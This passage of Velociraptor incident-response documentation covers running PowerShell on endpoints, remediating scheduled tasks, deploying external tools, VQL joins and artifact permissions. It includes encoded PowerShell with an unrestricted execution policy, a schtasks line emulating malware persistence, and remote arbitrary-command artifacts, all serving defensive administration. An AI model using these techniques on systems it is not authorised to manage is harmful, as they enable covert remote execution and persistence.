For this example we will use the following very simple snippet of
PowerShell which simply lists the names, process id and binary path of
all running processes.

```powershell
Get-Process | Select Name, Id, Path
```

![Powershell snippet for listing processes](image8.png)

In order to run powershell code from Velociraptor we will use the
`execve()` plugin to shell out to powershell. The `execve()` plugin
takes a list of args and builds a correctly escaped command line.

{{% notice warning %}}

The `execve()` plugin takes a **list** of command line arguments
(i.e. `argv`). Velociraptor will combine this list into a valid
command line by itself taking care to escape specific args (On
Windows). Do not attempt to construct this list from a single command
line string, since this will likely produce an opportunity for
[Command Line
Injection](https://owasp.org/www-community/attacks/Command_Injection)
if the commandline incorporates a user provided string.

Velociraptor minimizes the potential for this by requiring each
argument to be explicitly provided.

{{% /notice %}}

Here is a simple artifact that runs the powershell script via `execve()`

```yaml
name: Custom.PowershellTest
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET PowershellScript = '''Get-Process | SELECT Name, Id, Path'''
        SELECT * FROM execve(argv=["Powershell", "-ExecutionPolicy",
            "unrestricted", "-c", PowershellScript])
```

![Extending VQL with Powershell](ps1.png)

Collecting the artifact will result in the output of the powershell
script in an Stdout column.

![Extending VQL with Powershell - unstructured output](ps2.png)

{{% notice tip "Encoding Powershell scripts" %}}

In the above artifact we relied on Velociraptor to properly escape the
powershell script to the powershell interpreter on the
commandline. For more reliable encoding, we can base64 encode the
script:

```sql
SELECT * FROM execve(argv=["Powershell", "-ExecutionPolicy",
 "unrestricted", "-EncodedCommand",
 base64encode(string=utf16_encode(string=PowershellScript))])
```

Alternative, we can write the Powershell script into a temporary file
and run it from there:

```sql
LET ps1 <= tempfile(extension=".ps1", data=PowershellScript)
SELECT * FROM execve(
  argv=["Powershell", "-ExecutionPolicy", "unrestricted", ps1)
```
{{% /notice %}}

### Dealing with output

Using the `execve()` plugin we can see the output in the `Stdout`
column. However, it would be better to be able to deal with structured
output. Ideally we would like the powershell enabled artifact to
produce structured data that can be further processed by VQL.

We can use powershell's `ConvertTo-Json` to convert output to JSON,
and then use Velociraptor's `parse_json()` plugin to obtain structured
output.

```yaml
name: Custom.PowershellTest
sources:
  - precondition:
        SELECT OS From info() where OS = 'windows'

    query: |
        LET PowershellScript = '''Get-Process | SELECT Name, Id, Path | ConvertTo-Json'''
        SELECT * FROM foreach(
          row={
            SELECT Stdout FROM execve(argv=["Powershell", "-ExecutionPolicy",
                "unrestricted", "-c", PowershellScript], length=1000000)
          }, query={
            SELECT * FROM parse_json_array(data=Stdout)
        })
```

Normally the `execve()` plugin emits a row with the child process's
Stdout as soon as data is available. However in this case, splitting
the output will break the JSON string and prevent Velociraptor from
properly parsing it. Therefore, we supply the `length=1000000`
parameter indicating that Stdout will be buffered up to the specified
length before emitting the row.

![Extending with Powershell - structured output](ps3.png)

Note how the output now appears as a regular table with rows and
columns. This allows VQL or operate on the result set as if it was
natively generated by a VQL plugin!

### Reusing powershell artifacts

Since our powershell script is now encapsulated, we can use it inside
other artifacts and plain VQL.  Users of this artifact dont care what
the PowerShell Script is or what it does - we have encapsulation!

![Reusing an artifact from VQL](ps4.png)

## Remediation

Remediation means to restore the network from a compromised state -
Usually remove persistence, and clean up infected machines. Unlike
traditional DFIR work that focuses on detection with minimal
interference of the endpoint, remediation aims to modify the endpoint
in order to actively remove threats and harden the endpoint against
future compromise.

{{% notice warning "Remediation is a risky operation" %}}

Remediation is inherently risky! If a bug occurs that breaks the
endpoints, it is possible to damage the network quickly. Always
structure your artifacts so they show a dry run - what would have been
modified before actually performing the remediation. Always test your
remediation artifacts on selected endpoints before starting a wide
hunt everywhere.

{{% /notice %}}

### Example: Remediate scheduled tasks

For this example we will schedule a task to run daily. This emulates a
common persistence used by malware to re-infect the machine daily,
even after the machine is cleaned up.

```ps1
SCHTASKS /CREATE /SC DAILY /TN "EvilTask" /TR "dir c:" /ST 20:01
```

First let us find our evil task by collecting the
`Windows.System.TaskScheduler` artifact.

![Collecting Scheduled tasks](scheduled_tasks.png)

Once we identify the malicious scheduled task we can remove it. An
example of such a remediation artifact is in
`Windows.Remediation.ScheduledTasks` artifact. Here is the relevant
VQL from that artifact.

```sql
SELECT * FROM foreach(row=tasks,
  query={
    SELECT * FROM if(condition= ReallyDoIt='Y',
      then={
        SELECT OSPath, Name, Command, Arguments, ComHandler, UserId, _XML
        FROM execve(argv=["powershell",
           "-ExecutionPolicy", "Unrestricted", "-encodedCommand",
              base64encode(string=utf16_encode(
              string=format(format=script, args=[Name])))
        ])
      }, else={
        SELECT OSPath, Name, Command, Arguments, ComHandler, UserId, _XML
        FROM scope()
      })
  })
```

Note the `ReallyDoIt` condition ensuring a dry run - if the parameter
is not set, the artifact will report all the tasks that match but will
not actually remove them.

We can perform a wider hunt to uncover potential malicious tasks and
see if any false positives will be found.

## Using external tools

Velociraptor is an extremely capable tool, but there will always be
situations where there will be a gap in its capabilities. We
previously saw how we can extend VQL using powershell, but what if we
have an external binary we would like to run on the endpoint?

We know how to shell out to an external binary using the `execve()`
plugin, but how do we ensure the binary exists on the endpoint in the
first place?

Velociraptor has the ability to manage external tools for artifacts
that need to use them:

* Velociraptor will ensure the tool is uploaded to the endpoint
* If the tool version is updated, Velociraptor will ensure the new version is used.
* Many artifacts need to use the same external binary each time, it
  makes sense to cache the binary on the endpoint so subsequent
  execution simply use the same binary.

As an admin, you can control aspects of this process, such as require
the tool to be downloaded from a certain URL (e.g. an S3 bucket).

As an artifact writer you can specify your artifact will use a certain
tool and provide a hint of where to download it from.

### The Autoruns artifact

We will go through an example to understand this process. Let's
consider the `Windows.Sysinternals.Autoruns` artifact. This is a
commonly used artifact that launches the `autorunsc.exe` binary
(looking for common malware persistence) on the endpoint, collects the
output and converts the results to a table.

1. The artifact defines an external tool by specifying the `tools`
   attribute. The most important part is the `name` field, naming the
   tool uniquely.

   We can also provide a URL where the binary will be downloaded from
   if required.

```sql
name: Windows.Sysinternals.Autoruns
tools:
  - name: Autorun_amd64
    url: https://live.sysinternals.com/tools/autorunsc64.exe
```

2. Next we call the `Generic.Utils.FetchBinary` artifact within the
   query in order to materialize the tool on the endpoint. In this
   case we fetch the correct tool based on the architecture.

```sql
sources:
  - query: |
      LET os_info <= SELECT Architecture FROM info()

      // Get the path to the binary.
      LET bin <= SELECT * FROM Artifact.Generic.Utils.FetchBinary(
              ToolName= "Autorun_" + os_info[0].Architecture,
              ToolInfo=ToolInfo)
```

3. Next we simply run the tool and collect its output.

```sql
      LET output = SELECT * FROM execve(argv=[
           bin[0].OSPath,
           '-nobanner', '-accepteula', '-t', '-a', '*', '-c', '*'],
           length=10000000)
```

Let's collect the artifact. Simply click "New collection" then search
for the autoruns artifact.

![Collecting the Autoruns artifact](autoruns.png)

We immediately see the tools in the artifact description. These links
allow us to configure the tool. We can see the hash and the URL the
tool will be fetched from. The server keeps track of the binary hash
and requires it to match what was downloaded.

![The Autoruns tools setup screen](tools.png)

As an administrator we have the option to override the binary with our
own copy by uploading into the GUI. We can also provide an alternative
URL to serve the binary from.

![Autoruns artifact query logs](autoruns2.png)

Once the artifact is launched we can see how it works from the query
logs:

1. First the artifact waits for a random time in order to not
   overwhelm the server.
2. Next the endpoint will download the binary from a server provided
   URL. The server also tells the endpoint the tool's expected hash.
3. The endpoint compares the hash of the file it downloaded with the
   expected hash.
4. Once the hashes agree, the endpoint will copy the executable into
   the permanent cache directory.
5. The tool is now launched and the output parsed in VQL rows.

{{% notice tip "Encapsulation of artifacts" %}}

You can call any artifact from your own VQL regardless of whether they
use tools. For example, the `Windows.Sysinternals.Autoruns` artifact
can be used directly. Velociraptor will ensure dependent tools are
present on the endpoint for all dependencies.

```sql
SELECT * FROM Artifact.Windows.Sysinternals.Autoruns()
WHERE Category =~ "Services" AND `Launch String` =~ "COMSPEC"
```

{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/vql/yara/_index.md
======
---
title: "YARA in Velociraptor"
date: 2025-01-24
draft: true
weight: 60
---

the yara() plugin can scan files in one of two ways - using libyara directly or
using Velociraptor accessors using libyara directly has some advantages - what
it does is mmap the whole file into memory and so a rule can match any part of
the file at the same time

so when you call yara() without an accessor specified (or with "auto" accessor)
we just delegate to libyara to do the scanning. If you use an accessor then we
read the data in buffers and scan a buffer at the time
(https://docs.velociraptor.app/vql_reference/parsers/yara/ - this is where
blocksize comes in)

the disadvantage here is that the rule can only really match one buffer at the time
but limiting the iops can not work with libyara way because we dont control it
it only works when using the accessor

---END OF FILE---

======
FILE: /content/docs/vql/join/_index.md
======
---
title: "JOIN in VQL"
date: 2021-06-11T05:55:46Z
draft: false
weight: 30
---

As mentioned previously, VQL does not support the `JOIN` operator. If
you are coming from a background in SQL you might be wondering how to
emulate a `JOIN` in VQL?

## What is SQL JOIN anyway?

First what are `JOIN` operations in SQL?

In `SQL`, a `JOIN` is used to combine rows from two or more tables,
based on a related column between them.

To better understand SQL JOIN, we can work through an
[example](https://www.w3schools.com/sql/sql_join.asp) of a `JOIN` SQL
query:

```sql
SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate
FROM Orders
INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID;
```

The above SQL query selects rows from the `Customers` table matching
with rows in the `Orders` table, where the `CustomerID` field is the
same.

Replicating the example at
[www.w3schools.com](https://www.w3schools.com/sql/sql_join.asp),
assume the `Order` table is

|OrderID|CustomerID|OrderDate |
|-------|----------|----------|
|10308  |         2|1996-09-18|
|10309  |         3|1996-09-19|
|10310  |         1|1996-09-20|

And the `Customers` table is:

|CustomerID|CustomerName|ContactName|Country|
|----------|------------|-----------|-------|
|1|Alfreds Futterkiste|Maria Anders|Germany|
|2|Ana Trujillo Emparedados y helados|Ana Trujillo|Mexico|
|3|Antonio Moreno Taquería|Antonio Moreno|Mexico|


Let's think about how to calculate our SQL query, which joins the two
tables on the `CustomerID` column.

One very naive approach is:

1. Start with the `Orders` table, taking the first row:

|OrderID|CustomerID|OrderDate |
|-------|----------|----------|
|10308  |         2|1996-09-18|


2. Now scan the `Customers` table looking for a row where `CustomerID`
   is equal to 2, giving:

|CustomerID|CustomerName|ContactName|Country|
|----------|------------|-----------|-------|
|2         |Ana Trujillo Emparedados y helados|Ana Trujillo|Mexico|

3. Next we select the `OrderID` and `OrderDate` from the first table
   and `CustomerName` from the second table.

4. We then go back to step 1, choosing the next row in the `Orders`
   table, scanning the `Customers` table again etc, until all the
   orders are calculated.

Calculating the `JOIN` operation using the above algorithm is obvious
not efficient: If there are `N` rows in the `Orders` table, and `M`
rows in the `Customers` table, we will need to scan on the order of `N
x M` rows. As the size of the tables increases this complexity grows
substantially.

Usually in `SQL` tables, we can add an index though. An index allows
us to find a row very quickly. For example, if there is an index on
the `CustomerID` column in the `Customers` table we can retrieve the
row with a given `CustomerID` in constant time. This speeds up the
operation significantly as we only need to process `N` rows instead of
`N x M`.

The `SQL Query Optimiser` is a part of the SQL engine which plans the
Query execution in such a way as to make best use of all available
indexes. Therefore in SQL, a JOIN operation allows the database to
utilize indexes to make the query much faster.

## Using JOIN in VQL

In the previous example we saw exactly what a `JOIN` operation looks
like in `SQL` and how the database can utilize indexes to make the
operation very fast. In VQL, however all data is dynamic because our
data sources are plugins which calculate rows on the fly. Because we
dont have a static table, it means that we can not have a permanent
index on this data.

Therefore, VQL does not have indexes! As such, there is no benefit in
a query optimizer because there are no indexes to leverage! In VQL,
what you see is what you get - the query is executed exactly how it is
written.

Let's work through the exact same example as above and see how the
same `JOIN` operation can be done in VQL. You should replicate the
following yourself by copying the VQL into a notebook and getting the
feel of how these queries operate.

First we will load the tables as CSV files

```vql
LET OrdersTable = SELECT *
  FROM parse_csv(accessor="data", filename='''
OrderID,CustomerID,OrderDate
10308,2,1996-09-18
10309,3,1996-09-19
10310,1,1996-09-20
''')

LET CustomersTable = SELECT *
  FROM parse_csv(accessor="data", filename='''
CustomerID,CustomerName,ContactName,Country
1,Alfreds Futterkiste,Maria Anders,Germany
2,Ana Trujillo Emparedados y helados,Ana Trujillo,Mexico
3,Antonio Moreno Taquería,Antonio Moreno,Mexico
''')
```

Next we implement the naive algorithm as described above: For each
row in the `Orders` table we find the row in the `Customers` table
with the same `CustomerID`:

```vql
SELECT * FROM foreach(row={
  SELECT *, CustomerID AS Orders_CustomerID
  FROM OrdersTable
}, query={
  SELECT OrderID, CustomerName, OrderDate
  FROM CustomersTable
  WHERE CustomerID = Orders_CustomerID
})
```

![In VQL foreach() is equivalent to the SQL JOIN](joined_table.png)

## What about indexes?

The previous discussion showed how a JOIN in SQL is equivalent to a
`foreach()` VQL query, and admittedly even in SQL when there are no
indexes, the database will resort to a row scan yielding similarly bad
performance.

However, the advantage of SQL is in having indexes on tables! When an
index is present, the JOIN operation will be very fast because step 2
in the above algorithm can utilize the index to quickly find the row
with the required CustomerID.

Although VQL does not have permanent indexes (because the data is
usually dynamic) it is possible to create an index **for the duration
of the query**.

In VQL the index is provided by the `memoize()` function. This
function builds an index on the output of a query and retrieves a row
based on the index very quickly. Currently the index is in memory but
in future versions it may be file backed if needed.

Let's use an index to speed up the `foreach()` query in the example
above.

```vql
LET CustomerIDLookup <= memoize(
  key="CustomerID",
  query={
    SELECT CustomerID, CustomerName
    FROM Customers
  }, period=10000)
```

This builds an index of the `Customers` table keyed on the `CustomerID`
key. Since VQL data can be dynamic, the `memoize()` function allows to
define a freshness lifetime. After this period the index is discarded
and rebuilt. This allows VQL queries to adapt to evolving conditions
on the endpoint.

Now we can adapt the above algorithm:

1. Scan the `Orders` table
2. Select the `OrderID` and `OrderDate` for each order,
3. Fetch the row in the `Customers` table using the `CustomerID` index
4. Add the additional `CustomerName` column

```vql
SELECT OrderID, OrderDate,
    get(item=CustomerIDLookup, field=CustomerID).CustomerName AS CustomerName
FROM OrdersTable
```

## What about other types of JOIN?

There are several variations of the `JOIN` operator but they all
basically boil down to looking up indexes (this is ultimately what the
database engine does anyway).

For example an `INNER JOIN` returns all the Orders as long as they do
have a Customer associated with them:

```vql
SELECT OrderID, OrderDate,
    get(item=CustomerIDLookup, field=CustomerID).CustomerName AS CustomerName
FROM OrdersTable
WHERE get(item=CustomerIDLookup, field=CustomerID)
```

## How does this compare to SQL?

The important takeaway from this article is that the main difference
between SQL and VQL are not due to the limitations in the languages,
but because the basic assumptions are different. SQL operates on
static tables with data that does not change. Therefore it is possible
to build long lived indexes that can be queried many times.

With dynamic data this is not possible - indexes need to be rebuilt on
the fly for the duration of the query. For example if we want to
lookup a process by PID, we have to `memoize()` the process listing at
the start of the query, then query it multiple times during the rest
of the query. We need to be aware that processes start and stop all
the time, hence the process listing will become stale so will need to
be refreshed.

Building the indexes takes a certain amount of time so it only makes
sense if they will be frequently queried.

---END OF FILE---

======
FILE: /content/docs/vql/sigma/_index.md
======
---
title: "Sigma in Velociraptor"
date: 2025-01-24
draft: true
weight: 50
---


---END OF FILE---

======
FILE: /content/docs/vql/vql_reference/_index.md
======
---
title: "VQL Reference"
menutitle: VQL Reference
date: 2025-01-24
draft: false
weight: 100
noDisqus: true
no_edit: true
disableToc: true
chapter: false
pre: <i class="fas fa-book"></i>
---

{{< include-content "/content/vql_reference/_index.md" >}}
---END OF FILE---

======
FILE: /content/docs/artifacts/_index.md
======
---
title: "Artifacts"
date: 2021-06-12T05:20:45Z
draft: false
weight: 30
aliases:
  - "/docs/gui/artifacts/"
  - "/docs/vql/artifacts/"
---

## What are Artifacts?

At it's core Velociraptor is simply a VQL engine . That is, it processes a VQL
query producing a series of rows and sends those rows to the server.

An **Artifact** is a way to package one or more VQL queries and related data in
a human readable YAML file, give it a name, and allow users to collect it. An
Artifact file encapsulates one or more queries to collect data or answer a
specific question about the endpoint.

Artifacts can be thought of as VQL "modules". By encapsulating a VQL query
inside a YAML file, users do not need to understand the query to use it. This
facilitates knowledge sharing with more experienced users.

### A Basic Example

Usually an artifact is geared towards collecting a single type of information
from the endpoint.

For example consider the following artifact:

```yaml
name: Custom.Artifact.Name
description: |
   This is the human readable description of the artifact.

type: CLIENT

parameters:
   - name: FirstParameter
     default: Default Value of first parameter

precondition: ""

sources:
  - name: MySource
    precondition:
      SELECT OS From info() where OS = 'windows' OR OS = 'linux' OR OS = 'darwin'

    query: |
      SELECT * FROM info()
      LIMIT 10
```

The Artifact contains a number of important YAML fields:

1. **Name**: The artifact contains a name. By convention the name is
   segmented by dots in a hierarchy. The Name appears in the GUI and
   can be searched on.
2. **Description**: Artifacts contain a human readable description. The
   description field is also searchable in the GUI and so should
   contain relevant keywords that make the artifact more discoverable.
3. **Type**: The type of the Artifact. Since Velociraptor uses VQL in many
   different contexts, the type of the artifact hints to the GUI where
   the artifact is meant to run. For example, a CLIENT artifact is
   meant to be run on the endpoint, while a SERVER artifact is meant
   to be run on the server. The artifact type is only relevant for the
   GUI.
4. **Parameters**: An artifact may declare parameters, in which case they
   may be set by the GUI user to customize the artifact collection.
5. **Sources**: The artifact may define a number of VQL sources to
   generate result tables. Each source generates a single table. If
   more than one source is given, they must all have unique names.
6. **Precondition**: A source may define a precondition query. This query
   will be run prior to collecting the source. If it returns no rows
   then the collection will be skipped. Preconditions make it safe to
   collect artifacts from all hosts (e.g. in a hunt), and ensure that
   only artifacts that make sense to collect are actually run.
7. **Query**: The query that will be used to collect that source. Note
   that since each source **must** produce a single table, the query
   should have exactly one `SELECT` clause and it must be at the end
   of the query potentially following any `LET` queries.

## Parameters

Artifact parameters allow the user to customize the collection in a
controlled way - without needing to edit the VQL. The GUI will present
a form that allows the user to update the parameters prior to each
collection.

Parameters may define a type. This type will be used to hint to the
GUI how to render the form element. The type also determines how the
parameter is sent to the client and ensures the parameter appears as
that type in the query.

Prior to launching the query on the endpoint, Velociraptor will
populate the scope with the parameters. This allows the VQL query to
directly access the parameters.

Artifact parameters are sent to the client as strings The client
automatically parses them into a VQL type depending on the parameter's
type specification.  The GUI uses type specification to render an
appropriate UI

### Parameter types

Currently the following parameter types are supported

* **int, integer**: The parameter is an integer
* **timestamp**: The parameter is a timestamp. The GUI will present a time widget to assist you in selecting a timestamp
* **csv**: Parameter appears as a list of dicts formatted as a CSV. The GUI will present a CSV editor to assist in pasting or editing structured CSV data.
* **json**: Parameter is a JSON encoded dict
* **json_array**: The parameter is a list of dicts encoded as a JSON blob (similar to csv)
* **bool**: The parameter is a boolean (TRUE/YES/Y/OK)
* **int**, **in64**, **integer**: The parameter is an integer.
* **float**: The parameter is a float.
* **string**: The parameter is a string (the default type)
* **regex**: The parameter is a Regular Expression. The GUI will present a Regular Expression editor to help you write it.
* **redacted**: The parameter should be redacted. The value of this parameter is redacted in the request or other places where it may be logged.
* **upload**: The parameter contains a string which is uploaded from a file. NOTE- this is limited to 4mb - if you need larger files use `upload_file`. The GUI will present a file upload widget to allow you to upload a file for this request only!
* **upload_file**: The parameter will be the name of a temporary file on the endpoint containing the contents of the uploaded file.
* **server_metadata**: The server will populate this parameter from the server metadata service prior to launching the artifact. The parameter will not be settable in the GUI
* **artifactset**: A set of artifacts. This is probably only useful on server artifacts as clients do not have access to arbitrary artifacts. You must also include the `artifact_type` parameter which can be `CLIENT`, `SERVER`, `CLIENT_EVENT`, `SERVER_EVENT`
* **json**, **json_array**, **xml**, **yaml**: This is a data blob encoded as a string.


### A More Advanced Example

Let's take a look at a typical artifact `Windows.Detection.Mutants`.

![Mutants artifact](mutants.png)

This artifact uncovers the mutants (named mutexes) on a system, using
two methods. First we enumerate all handles, and check which process
is holding a handle to a mutant object. Alternatively we enumerate the
kernel object manager to receive the same information.

Therefore this artifact contains two sources - each gets similar
information in a different way. A user who is just interested in
listing the Mutants on an endpoint would probably need to see both
results.

We also see some parameters declared to allow a user to filter by
process name or mutant name.

## Preconditions and source queries

A precondition is a query that is run before collecting the artifact
to determine if the artifact should be collected at all. The
precondition makes it safe to collect artifacts without needing to
worry about if the artifact is designed for this particular
architecture or operating system. For example, performing a hunt for a
Windows only artifact is safe to target all clients because Linux
clients will just ignore it and return no rows. Most preconditions
target specific operating systems or architectures but the precondition
can be an arbitrary query.

You can specify a precondition at the top level of the artifact or at
each source:

* For a top level precondition, after testing for the precondition,
  the queries from each source are run in series within the same query
  scope. This means you can define a VQL variable in an earlier source
  and use it in another source.
* If the precondition is specified at the source level, the VQL engine
  has no idea if any particular source will be use or not. Therefore
  the engine treats each source as an independent query within its own
  scope. Since sources are independent they will run in parallel and
  any VQL variable defined in one source will not be visible to other
  sources.

## Artifact writing tips

Typically we have a new idea for a new detection. The first step is to
develop the VQL that will detect the anomaly by writing the VQL in a
notebook cell on the target operating system itself (usually we use
`velociraptor gui` to start a new local server).

While developing the VQL, Use the `log()` VQL function librally to
provide print debugging.

Use format(format="%T %v", args=[X, X]) to learn about a value's type
and value.

## Calling artifacts from VQL

You can call other artifacts from your own VQL using the
`Artifact.<artifact name>` plugin notation. Args to the `Artifact()`
plugin are passed as artifact parameters.

![Calling artifacts](calling_artifacts.png)

When calling artifacts types are not converted. Make sure you pass the
expected types

{{% notice info "Compiling artifacts into VQL requests" %}}

When collecting an artifact from the client, the server **compiles**
the artifact and it's dependencies into raw VQL statements and sends
these to the client for evaluation. We never rely on the artifact
definitions embedded in the client itself - instead we always send the
compiled VQL to the client. This allows us to upgrade artifact
definitions on the server without needing to update the client itself.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/artifacts/export_imports/_index.md
======
---
menutitle: "Exports & Imports"
title: "Exports & Imports"
date: 2025-01-25
draft: true
weight: 40
---

This section will cover exports and imports.

## How exports are processed

## How imports are processed

---END OF FILE---

======
FILE: /content/docs/artifacts/use_cases/_index.md
======
---
menutitle: "Other Use Cases"
title: "Other Use Cases"
date: 2025-01-25
draft: true
weight: 70
---

Artifacts can have ZERO or more sources.
It may seem strange at first to think about artifact with no sources, however this allows for some interesting use cases, for example:
- export-imports
    - shared variables
    - shared custom functions and plugins
    - shared parameter values (because parameters are really preset variables)
- defining server event queues
- documentation (using description-only artifacts)
- storing tool definitions
---END OF FILE---

======
FILE: /content/docs/artifacts/sources/_index.md
======
---
menutitle: "Sources"
title: "Artifact Sources"
date: 2025-01-25
draft: true
weight: 20
---

This section will cover artifact sources.

## Named sources

## Notebook cell templates

---END OF FILE---

======
FILE: /content/docs/artifacts/artifact_reference/_index.md
======
---
title: "Artifact Reference"
menutitle: Artifact Reference
date: 2025-01-24
draft: false
weight: 90
noDisqus: true
no_edit: true
disableToc: true
chapter: false
pre: <i class="fas fa-book"></i>
---

{{< include-content "/content/artifact_references/_index.md" >}}
---END OF FILE---

======
FILE: /content/docs/artifacts/basics/_index.md
======
---
menutitle: "Basic Fields"
title: "Basic Fields"
date: 2025-01-25
draft: true
weight: 5
---

## Mandatory fields

## Informational fields


---END OF FILE---

======
FILE: /content/docs/artifacts/exchange_reference/_index.md
======
---
menutitle: "Artifact Exchange"
title: "Artifact Exchange"
date: 2025-01-24
draft: false
weight: 100
noDisqus: true
no_edit: true
disableToc: true
chapter: false
pre: <i class="fas fa-code"></i>
---

{{< include-content "/content/exchange/_index.md" >}}
---END OF FILE---

======
FILE: /content/docs/artifacts/preconditions/_index.md
======
---
menutitle: "Preconditions"
title: "Artifact Preconditions"
date: 2025-01-25
draft: true
weight: 30
---

This section will cover artifact preconditions.

## How preconditions are evaluated

## Preconditions effect on execution sequence

## Preconditions when calling other artifacts

---END OF FILE---

======
FILE: /content/docs/artifacts/permissions/_index.md
======
---
menutitle: "Permissions"
title: "Artifact Permissions"
date: 2025-01-25
draft: true
weight: 45
---

This section will cover artifact permissions.

---END OF FILE---

======
FILE: /content/docs/artifacts/tips/_index.md
======
---
menutitle: "Artifact Writing Tips"
title: "Artifact Writing Tips"
date: 2025-01-25
draft: true
weight: 80
---

---END OF FILE---

======
FILE: /content/docs/artifacts/custom/_index.md
======
---
menutitle: "Custom Artifacts"
title: "Artifact Sources"
date: 2025-01-25
draft: true
weight: 50
---

This section will cover custom artifacts.

## Custom vs Built-in Artifacts

## Custom artifact overrides

e.g. Custom.Generic.Client.Info

## Inheritance and Masking

## How to add and manage custom artifacts.

### In the GUI

- Add a single artifact
- Add an artifact pack
- Import artifacts from external sources (including predefined ones like Sigma)

### Outside of the GUI

- Using artifact_set()
- Add from folder specified via the Frontend.artifact_definitions_directory config setting
- Add from folder specified via the --definitions command line flag (less likely to be used unless you're running your server in a terminal)
- Embed artifacts in the configuration autoexec.artifact_definitions section


---END OF FILE---

======
FILE: /content/docs/artifacts/tools/_index.md
======
---
menutitle: "Tools"
title: "Tools"
date: 2025-01-25
draft: true
weight: 65
---

This section will cover tool definitions.

---END OF FILE---

======
FILE: /content/docs/artifacts/parameters/_index.md
======
---
menutitle: "Parameters"
title: "Artifact Parameters"
date: 2025-01-25
draft: true
weight: 10
---

This section will cover artifact parameters.

## How parameters are processed

Parameters are essentially VQL variables. The values are converted to the specified type at runtime.
- Demonstrate this:
   - using typeof()
   - by overriding a parameter value with a VQL assignment.

## Parameter types

- artifactset
- csv
- bool
- choice
- float
- hidden
- int / integer / int64
- json
- json_array / regex_array / multichoice https://github.com/Velocidex/velociraptor/pull/3392
- redacted
- string / regex / yara	- (these types are passed through unparsed)
- server_metadata
- starlark
- timestamp
- upload
- upload_file
- xml
- yaml
- yara_lint?

## Parameter fields

[Descriptions of the parameter fields](https://github.com/Velocidex/velociraptor/blob/52dc005b1594723716dc6b3e3a7a719a885b74ef/docs/references/server.config.yaml#L1050)
- name
- description
- default
- type
- friendly_name
- validating_regex (this is just a visual indicator. It will not stop you from running the artifact)
- artifact_type (only used for type = artifactset)
---END OF FILE---

======
FILE: /content/docs/artifacts/security/_index.md
======
---
menutitle: "Security"
title: "Artifacts and Security"
date: 2025-01-25
weight: 55
---

Artifacts are the main way in which users interact with Velociraptor:
Users launch artifact collections from clients and collect artifacts
on the Velociraptor server.

At its core an artifact is simply a way to package VQL queries to make
them easier to use.

However, for new users the number of artifacts can be
overwhelming. Coupled with the power that artifacts can wield there is
a need to control which users are able to access which artifacts: This
helps to avoid mistakes due to inexperience. For example running a
`Windows.KapeFiles.Target` collections as a large scale hunt is almost
always a bad idea!

Most users develop their own operating procedures specifying:
1. Which artifacts are to be used in which situation
2. Who is allowed to launch more sensitive artifacts
3. How artifacts are to be used (what type of arguments are allowed).

In the below page we discuss how Velociraptor enabled each of these
goals.

## Hidden artifacts

The first goal is to clean up the vast number of artifacts that are
presented through the GUI. Because Velociraptor allows artifacts to be
customized, new artifacts to be added to large number of artifacts
imported from external sources (i.e. `Artifact Packs`), there could be
hundreds or thousands of artifacts loaded in the system. Many have
similar but different functionality. This can overwhelm a user with
too much choice and be confusing.

To clean up the interface, Velociraptor allows artifacts to be hidden
from the GUI. This means that they are not shown as part of the search
functionality in the artifact collections wizard or in the
artifact. However the artifacts still exist in Velociraptor and can be
seen as part of the `artifact_definitions()` plugin output.

The visibility of an artifact is controlled by `artifact metadata` - a
field attached to each artifact in the system. You can hide or show
each artifact using the `artifact_set_metadata()` function.

### Example: Making only certain artifacts visible.

The following VQL can be run in a notebook to hide all artifacts other
than a selected set:

```sql
LET VisibleArtifacts <= SELECT * FROM parse_csv(accessor="data",
filename='''Artifacts
Windows.Search.FileFinder
Windows.Forensics.Usn
Windows.NTFS.MFT
Generic.Client.Info
''')


SELECT name, name in VisibleArtifacts.Artifacts AS Visible
FROM artifact_definitions()
WHERE artifact_set_metadata(hidden=NOT name in VisibleArtifacts.Artifacts, name=name) OR TRUE
```

This results in only those artifacts appearing in the GUI.

![Hidden Artifacts](hidden_artifacts.svg)

This reduced view can help guide users into more preferred playbooks
and procedures, reducing confusion.


## Basic artifacts

While hiding the artifacts in the GUI helps to reduce clutter, it
does not stop someone from launching those artifacts (for example
using a VQL query). The artifacts are actually still available but
they are just hidden. Therefore hiding an artifact **is not a security
measure**.

In Velociraptor, a user's permissions control what actions they can
take in the GUI **or** using a VQL query. If a user is allowed to
collect artifacts from the client, they can collect **any** artifact,
including hidden artifacts.

However some artifacts are more dangerous than others and require more
experienced operators.

Velociraptor user permission are given as part of `Roles` or
specifically granted in the user policy.

![Giving a user reduced roles and additional permissions](user_permissions.svg)

The above example shows a user given the `Read Only` role. This role
does not allow the user to collect new artifacts from the endpoint,
nor does it allow them to update notebook cells (but they can read
notebooks).

However, here I give the user additional permissions on top of their role:

1. Label Clients - the user is allowed to manipulate client labels
2. Collect Basic Client - The user is allowed to collect basic artifacts from the client.
3. Notebook Editor - The user is allowed to update notebook cells (and
   by extension evaluate VQL queries on the server).


If the user attempts to collect an artifact from a client, they will
be denied because they do not have the `COLLECT_CLIENT` permission.

However we can allow the user to collect **Some** artifacts that we
deem to be safe.

```sql
LET BasicArtifacts <= SELECT * FROM parse_csv(accessor="data",
filename='''Artifacts
Generic.Client.Info
''')


SELECT name, name in BasicArtifacts.Artifacts AS Basic
FROM artifact_definitions()
WHERE artifact_set_metadata(basic=NOT name in BasicArtifacts.Artifacts, name=name) OR TRUE
```

The artifact `Generic.Client.Info` is deemed basic and therefore this
user can collect it.

## Controlling access to artifacts

Now that we have learned how to hide artifacts in the search GUI, and
how to mark some artifacts as basic, we can proceed to tie down some
artifacts in a safe way.

To illustrate this approach, suppose I wanted to allow my low
privilege user to run `ipconfig` on the remote system. I know that I
can shell out to the system shell using the artifact
`Windows.System.CmdShell`. However, giving the user access to that
artifact is extremely dangerous - because that artifact allows
arbitrary commands to be launched on the endpoint.

I want to further reduce the way in which the
`Windows.System.CmdShell` artifact is called by **removing the user's
choices for the artifact parameters**.

I can create a new artifact

```yaml
name: Custom.Ifconfig
sources:
  - query: |
        SELECT * FROM Artifact.Windows.System.CmdShell(Command="ipconfig")
```

This artifact takes no parameters and so the user can not change the
command to anything other than `ipconfig` (which I deem safe to run on
any endpoint).

Now I will add the `basic` metadata to this artifact which will allow
the user to launch it. However the user is unable to change the
parameters or run arbitrary code.

